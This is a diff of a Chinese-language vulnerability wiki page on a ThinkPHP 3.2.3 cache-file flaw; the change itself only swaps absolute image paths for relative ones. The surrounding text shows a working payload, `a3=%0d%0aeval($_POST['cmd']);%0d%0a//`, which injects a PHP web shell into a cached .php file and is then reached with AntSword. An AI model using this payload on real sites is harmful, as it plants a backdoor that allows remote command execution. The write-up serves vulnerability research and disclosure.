@@ -85,11 +85,11 @@ Thinkphp 3.2.3
     `http://www.0-sec.org/index.php/Home/Index/index.html`
     ，post数据：`a3=aaaa`
 
-![](/Users/aresx/Documents/VulWiki/.resource/Thinkphp3.2.3缓存漏洞/media/rId25.png)
+![](./.resource/Thinkphp3.2.3缓存漏洞/media/rId25.png)
 
 可以看到\$data参数经过序列化，直接写入php后缀的文件。F9运行可以看到，在`Application/Runtime/Temp/`文件夹下生成了php文件。
 
-![](/Users/aresx/Documents/VulWiki/.resource/Thinkphp3.2.3缓存漏洞/media/rId26.png)
+![](./.resource/Thinkphp3.2.3缓存漏洞/media/rId26.png)
 
 -   写入到文件被行注释了。
 
@@ -100,11 +100,11 @@ Thinkphp 3.2.3
 ```
 -   `a3=%0d%0aeval($_POST['cmd']);%0d%0a//`
 
-![](/Users/aresx/Documents/VulWiki/.resource/Thinkphp3.2.3缓存漏洞/media/rId27.png)
+![](./.resource/Thinkphp3.2.3缓存漏洞/media/rId27.png)
 
 -   之后用蚁剑连接成功
 
-![](/Users/aresx/Documents/VulWiki/.resource/Thinkphp3.2.3缓存漏洞/media/rId28.png)
+![](./.resource/Thinkphp3.2.3缓存漏洞/media/rId28.png)
 
 ### 总结
 
